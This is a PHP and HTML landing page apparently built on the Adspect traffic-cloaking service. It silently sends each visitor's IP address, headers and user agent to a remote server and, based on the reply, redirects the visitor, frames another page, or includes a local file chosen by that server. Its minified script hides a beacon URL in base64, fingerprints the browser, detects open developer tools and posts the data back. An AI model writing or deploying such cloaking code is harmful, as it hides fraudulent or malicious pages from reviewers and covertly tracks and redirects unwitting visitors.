<?php
 error_reporting(0); ini_set('display_errors', 0); if (!function_exists('adspect')) { function adspect_coalesce($array, $keys, $default = '') { if (is_scalar($keys)) { $keys = array($keys); } foreach ($keys as $key) { if (array_key_exists($key, $array)) { return $array[$key]; } } return $default; } function adspect_render() { require_once func_get_arg(0); } function adspect($sid, $iframe) { $curl = curl_init(); $ipaddr = adspect_coalesce($_SERVER, array( 'HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR' )); $proto = adspect_coalesce($_SERVER, 'SERVER_PROTOCOL', 'HTTP/1.1'); $ua = adspect_coalesce($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_coalesce($_SERVER, 'HTTP_REFERER'); $query = adspect_coalesce($_SERVER, 'QUERY_STRING'); $cookie = sha1(implode(':', array($sid, $ipaddr, $ua, $query))); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $headers = array(); foreach ($_SERVER as $key => $value) { if (substr_compare('HTTP_', $key, 0, 5) == 0) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } $payload['cookie'] = array($cookie, adspect_coalesce($_COOKIE, $cookie)); $payload['headers'] = $headers; curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); if (0) { header('Access-Control-Allow-Origin: *'); } } $sid = adspect_coalesce($_GET, '__sid', $sid); curl_setopt($curl, CURLOPT_DNS_CACHE_TIMEOUT, 60); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_HTTPHEADER, array( 'Adspect-JS: ' . 0, 'Adspect-IP: ' . $ipaddr, 'Adspect-UA: ' . $ua, 'Adspect-Referrer: ' . $referrer )); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $target = curl_exec($curl); $status = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Content-Type: text/html'); header('Cache-Control: no-store'); switch ($status) { case 202: break; case 200: if (0) { if ($target != '') { if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo $target; } else { $target = json_encode($target); echo "window.__location = {$target};"; break; } } } elseif (!preg_match('/^[[:alnum:]]+:/i', $target)) { $target = parse_url($target); $query = adspect_coalesce($target, 'query'); parse_str($query, $_GET); $_SERVER['QUERY_STRING'] = $query; unset($_POST['data']); $_SERVER['REQUEST_METHOD'] = 'GET'; $dirname = dirname($target['path']); if ($dirname[0] !== '/') { $dirname = __DIR__ . '/' . $dirname; } chdir($dirname); adspect_render(basename($target['path'])); } elseif ($iframe) { $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; } else { header("Location: {$target}"); } die; case 404: header("{$proto} 404 Not Found", true, 404); die; default: header("{$proto} 503 Service Unavailable", true, 503); die; } setcookie($cookie, hash('crc32b', $cookie), time() + 60); return $target; } } $target = adspect('1eadd181-7178-6100-a845-ac1f6b95a853', 0); ?>
<!DOCTYPE html>
<html>
<head>
  <meta name="referrer" content="no-referrer">
  <meta http-equiv="refresh" content="5; url=<?= htmlspecialchars($target) ?>">
</head>
<body>
  <script>
    (function(l,d,m,k){function g(a){var b={},e;for(e in a)try{var f=a[e];switch(typeof f){case "object":if(null===f)break;case "function":f=f.toString()}b[e]=f}catch(n){}return b}function h(){var a=d.createElement("form"),b=d.createElement("input");a.method="POST";a.action=m.href;b.type="hidden";b.name="data";b.value=JSON.stringify(c);a.appendChild(b);d.body.appendChild(a);a.submit()}(function(a,b){b.href=atob("aHR0cHM6Ly9iZWFjb24uYml0Y2hjbGljay5jb20vdjEvc3R5bGUuY3NzPw==")+(new Date).getTime();b.type="text/css";b.rel="stylesheet";a.appendChild(b)})(d.head||
d.getElementsByTagName("head")[0],d.createElement("link"));var c=g({eval:eval});c.window=g(l);c.document=g(d);c.documentElement=function(a){var b={};a=a.attributes;for(var e in a)e=a[e],b[e.nodeName]=e.nodeValue;return b}(d.documentElement);c.navigator=g(k);c.timezoneOffset=(new Date).getTimezoneOffset();(function(a,b){a.toString=function(){++b;return""};console.log(a);c.tostring=b})(function(){},0);try{throw Error();}catch(a){c.errorStack=a.stack}try{c.touchEvent=!!d.createEvent("TouchEvent")}catch(a){}try{k.permissions.query({name:"notifications"}).then(function(a){c.permissions=
[Notification.permission,a.state];h()},h)}catch(a){h()}})(window,document,location,navigator);
  </script>
</body>
</html>
